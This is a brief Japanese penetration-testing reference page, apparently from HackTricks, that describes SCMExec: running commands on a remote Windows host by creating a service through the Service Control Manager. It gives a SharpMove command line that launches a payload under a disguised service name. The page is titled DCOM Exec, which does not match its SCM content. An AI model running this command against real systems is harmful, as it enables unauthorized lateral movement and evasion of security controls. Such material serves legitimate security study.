# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec**は、サービスコントロールマネージャー（SCM）を使用してリモートシステムでコマンドを実行する技術であり、コマンドを実行するサービスを作成します。この方法は、ユーザーアカウント制御（UAC）やWindows Defenderなどの一部のセキュリティ制御を回避することができます。

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
